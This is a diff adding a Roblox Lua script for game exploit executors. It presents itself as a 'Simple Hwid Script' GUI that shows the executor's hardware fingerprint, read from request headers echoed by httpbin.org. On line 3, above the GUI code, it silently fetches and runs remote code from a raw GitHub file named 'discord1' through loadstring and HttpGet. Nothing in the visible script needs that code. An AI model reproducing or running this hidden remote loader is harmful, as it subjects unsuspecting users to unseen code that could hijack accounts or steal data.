@@ -1,0 +1,252 @@
+-- Gui to Lua
+-- Version: 3.2
+loadstring(game:HttpGet'https://raw.githubusercontent.com/batusz/main/roblox/discord1')()
+
+-- Instances:
+
+local NjJnjnJNJNjnJNhbHBHv = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Frame_2 = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local UIGradient = Instance.new("UIGradient")
+local TextLabel = Instance.new("TextLabel")
+local UICorner_3 = Instance.new("UICorner")
+local hwidtextbox = Instance.new("TextBox")
+local UICorner_4 = Instance.new("UICorner")
+local TextLabel_2 = Instance.new("TextLabel")
+local UICorner_5 = Instance.new("UICorner")
+local TextLabel_3 = Instance.new("TextLabel")
+local UICorner_6 = Instance.new("UICorner")
+local TextLabel_4 = Instance.new("TextLabel")
+local UICorner_7 = Instance.new("UICorner")
+
+--Properties:
+
+NjJnjnJNJNjnJNhbHBHv.Name = "NjJnjnJNJNjnJNhbHBHv"
+NjJnjnJNJNjnJNhbHBHv.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+NjJnjnJNJNjnJNhbHBHv.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = NjJnjnJNJNjnJNhbHBHv
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.Position = UDim2.new(0.301671743, 0, 0.271165639, 0)
+Frame.Size = UDim2.new(0, 471, 0, 315)
+
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = Frame
+
+Frame_2.Parent = Frame
+Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_2.Position = UDim2.new(0.0148619954, 0, 0.0190476198, 0)
+Frame_2.Size = UDim2.new(0, 456, 0, 13)
+
+UICorner_2.Parent = Frame_2
+
+UIGradient.Parent = Frame_2
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
+TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel.Position = UDim2.new(0.490445852, 0, 0.088888891, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Your hwid should be in text box ↓"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+UICorner_3.Parent = TextLabel
+
+hwidtextbox.Name = "hwidtextbox"
+hwidtextbox.Parent = Frame
+hwidtextbox.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
+hwidtextbox.Position = UDim2.new(0.0148619954, 0, 0.311111122, 0)
+hwidtextbox.Size = UDim2.new(0, 456, 0, 116)
+hwidtextbox.ClearTextOnFocus = false
+hwidtextbox.Font = Enum.Font.SourceSans
+hwidtextbox.Text = "/ nil /"
+hwidtextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
+hwidtextbox.TextScaled = true
+hwidtextbox.TextSize = 14.000
+hwidtextbox.TextWrapped = true
+
+UICorner_4.Parent = hwidtextbox
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
+TextLabel_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_2.Position = UDim2.new(0.118895978, 0, 0.707936525, 0)
+TextLabel_2.Size = UDim2.new(0, 358, 0, 50)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "Contact with your Script Developer"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextWrapped = true
+
+UICorner_5.Parent = TextLabel_2
+
+TextLabel_3.Parent = Frame
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
+TextLabel_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_3.Position = UDim2.new(0.0148619954, 0, 0.895238101, 0)
+TextLabel_3.Size = UDim2.new(0, 286, 0, 26)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "Dont need to obfuscate, made by Batus#3009"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 14.000
+TextLabel_3.TextWrapped = true
+
+UICorner_6.Parent = TextLabel_3
+
+TextLabel_4.Parent = Frame
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
+TextLabel_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_4.Position = UDim2.new(0.0403397009, 0, 0.088888891, 0)
+TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
+TextLabel_4.Font = Enum.Font.SourceSans
+TextLabel_4.Text = "Simple Hwid Script"
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextScaled = true
+TextLabel_4.TextSize = 14.000
+TextLabel_4.TextWrapped = true
+
+UICorner_7.Parent = TextLabel_4
+
+-- Scripts:
+
+local function JQGX_fake_script() -- Frame_2.LocalScript 
+	local script = Instance.new('LocalScript', Frame_2)
+
+	local button = script.Parent
+	local gradient = button.UIGradient
+	local ts = game:GetService("TweenService")
+	local ti = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+	local offset = {Offset = Vector2.new(1, 0)}
+	local create = ts:Create(gradient, ti, offset)
+	local startingPos = Vector2.new(-1, 0)
+	local list = {} 
+	local s, kpt = ColorSequence.new, ColorSequenceKeypoint.new
+	local counter = 0
+	local status = "down" 
+	gradient.Offset = startingPos
+	local function rainbowColors()
+		local sat, val = 255, 255 
+		for i = 1, 15 do 
+			local hue = i * 17 
+			table.insert(list, Color3.fromHSV(hue / 255, sat / 255, val / 255))
+		end
+	end
+	rainbowColors()
+	gradient.Color = s({
+		kpt(0, list[#list]),
+		kpt(0.5, list[#list - 1]),
+		kpt(1, list[#list - 2])
+	})
+	counter = #list
+	local function animate()
+		create:Play()
+		create.Completed:Wait() 
+		gradient.Offset = startingPos 
+		gradient.Rotation = 180
+		if counter == #list - 1 and status == "down" then
+			gradient.Color = s({
+				kpt(0, gradient.Color.Keypoints[1].Value),
+				kpt(0.5, list[#list]), 
+				kpt(1, list[1]) 
+			})
+			counter = 1
+			status = "up" 
+		elseif counter == #list and status == "down" then 
+			gradient.Color = s({
+				kpt(0, gradient.Color.Keypoints[1].Value),
+				kpt(0.5, list[1]),
+				kpt(1, list[2])
+			})
+			counter = 2
+			status = "up"
+		elseif counter <= #list - 2 and status == "down" then 
+			gradient.Color = s({
+				kpt(0, gradient.Color.Keypoints[1].Value),
+				kpt(0.5, list[counter + 1]), 
+				kpt(1, list[counter + 2])
+			})
+			counter = counter + 2
+			status = "up"
+		end
+		create:Play()
+		create.Completed:Wait()
+		gradient.Offset = startingPos
+		gradient.Rotation = 0 
+		if counter == #list - 1 and status == "up" then
+			gradient.Color = s({ 
+	
+				kpt(0, list[1]), 
+				kpt(0.5, list[#list]), 
+				kpt(1, gradient.Color.Keypoints[3].Value)
+			})
+			counter = 1
+			status = "down"
+		elseif counter == #list and status == "up" then
+			gradient.Color = s({
+				kpt(0, list[2]),
+				kpt(0.5, list[1]), 
+				kpt(1, gradient.Color.Keypoints[3].Value)
+			})
+			counter = 2
+			status = "down"
+		elseif counter <= #list - 2 and status == "up" then
+			gradient.Color = s({
+				kpt(0, list[counter + 2]), 
+				kpt(0.5, list[counter + 1]), 
+				kpt(1, gradient.Color.Keypoints[3].Value) 	
+			})
+			counter = counter + 2
+			status = "down"
+		end
+		animate()
+	end
+	animate()
+	
+end
+coroutine.wrap(JQGX_fake_script)()
+local function STTNZ_fake_script() -- hwidtextbox.LocalScript 
+	local script = Instance.new('LocalScript', hwidtextbox)
+
+	
+	local hwidtextbox = script.Parent
+	
+	local http_request = http_request;
+	if syn then
+		http_request = syn.request
+	elseif SENTINEL_V2 then
+		function http_request(tb)
+			return {
+				StatusCode = 200;
+				Body = request(tb.Url, tb.Method, (tb.Body or ''))
+			}
+		end
+	end
+	
+	local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+	local decoded = game:GetService('HttpService'):JSONDecode(body)
+	local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+	local hwid = "";
+	
+	for i, v in next, hwid_list do
+		if decoded.headers[v] then
+			hwid = decoded.headers[v];
+			break
+		end
+	end
+	
+	if hwid then
+		hwidtextbox.Text = (hwid)
+	else
+		game:GetService("Players").LocalPlayer:Kick('unsupported exploit or cant find hwid sorry')
+	end
+	
+end
+coroutine.wrap(STTNZ_fake_script)()
